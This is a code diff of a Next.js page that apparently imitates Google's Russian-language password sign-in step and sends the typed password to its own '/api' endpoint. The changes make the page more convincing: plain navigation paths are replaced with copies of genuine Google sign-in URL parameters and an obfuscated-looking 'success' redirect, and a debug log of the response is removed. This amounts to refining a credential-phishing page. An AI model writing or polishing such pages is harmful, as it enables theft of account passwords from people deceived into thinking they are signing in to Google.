@@ -1,5 +1,5 @@
 'use client'
-import styles from "../../../../page.module.css"
+import styles from "../../../../../page.module.css"
 import Svg from "@/components/Svg";
 import React, {useCallback, useRef, useState} from "react";
 import Link from "next/link";
@@ -32,7 +32,7 @@ export default function Page() {
             splitter.current.style.opacity='1'
             line.current.style.opacity='0'
         }
-        router.push('../')
+        router.push('/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fwww.google.com.ua%2F&ec=GAlAmgQ&hl=ru&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S520455428%3A1710420788140155&theme=mn')
     }, [router]);
     const submitPassword = useCallback(async(e: React.FormEvent<HTMLFormElement> | React.MouseEvent) => {
         if(e){
@@ -55,15 +55,15 @@ export default function Page() {
         } else {
             await axios.post('/api', {
                 password: value
-            }).then(data=>console.log(data))
+            })
             setValid(true)
-            router.push('/v3/signin/challenge/pwd/youAreSave')
+            router.push('/v3/signin/challenge/pwd/success-accede/ky?gygjk=5ukKyCTIhlcROS=qFReseNO9KGJT=eI4a7w=TMMZ%mrKDz=hJ&virQwwrRpqXVeXcrgBpP0borxdnx0Zav0=XpRYga4x3=jzQ')
         }
         if(splitter.current && line.current){
             splitter.current.style.opacity='1'
             line.current.style.opacity='0'
         }
-    }, [value, attempt]);
+    }, [value, attempt, router]);
     const load = useCallback(async(path: string) => {
         if(splitter.current && line.current){
             splitter.current.style.opacity='0.3'
@@ -137,7 +137,7 @@ export default function Page() {
                             </div>
                         </div>
                         <div className={styles.submit}>
-                            <div className={styles.create} onClick={()=>load('/v3/signin')}
+                            <div className={styles.create} onClick={()=>load('/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fwww.google.com.ua%2F&ec=GAlAmgQ&hl=ru&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S520455428%3A1710420788140155&theme=mn')}
                             >Забыли пароль?</div>
                             <div onClick={submitPassword} className={styles.next}>Далее</div>
                         </div>
